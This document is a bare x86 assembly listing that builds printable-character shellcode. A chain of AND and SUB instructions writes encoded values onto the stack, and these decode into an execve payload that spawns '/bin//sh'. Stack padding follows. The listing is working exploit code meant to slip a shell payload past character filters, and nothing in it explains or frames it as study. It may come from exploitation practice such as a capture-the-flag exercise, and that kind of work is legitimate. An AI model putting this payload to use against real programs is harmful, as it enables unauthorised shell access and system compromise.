global _start
	_start:
		;========================
		;  add esp, ??? 
		;========================
		push esp
		pop eax
		sub eax, 55555442H
		sub eax, 55555442H
		sub eax, 55555442H
		push eax
		pop esp
		;========================
		;  set $eax=0x90909090
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 25252526H
		sub eax, 25252525H
		sub eax, 25252525H
		push eax
		;========================
		;  set $eax=0x90909080
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 2525252bH
		sub eax, 2525252bH
		sub eax, 2525252aH
		push eax
		;========================
		;  set $eax=0xcd99580b
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 65223852H
		sub eax, 66223852H
		sub eax, 67223751H
		push eax
		;========================
		;  set $eax=0x6ae3896e
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 325e2831H
		sub eax, 315e2731H
		sub eax, 31602730H
		push eax
		;========================
		;  set $eax=0x69622f68
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 32354633H
		sub eax, 32344533H
		sub eax, 32344532H
		push eax
		;========================
		;  set $eax=0x68732f2f
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 332f4646H
		sub eax, 322f4546H
		sub eax, 322e4545H
		push eax
		;========================
		;  set $eax=0x6851c931
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 333a6745H
		sub eax, 323a6745H
		sub eax, 32396845H
		push eax
		;========================
		;  push 0x90
		;========================
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax

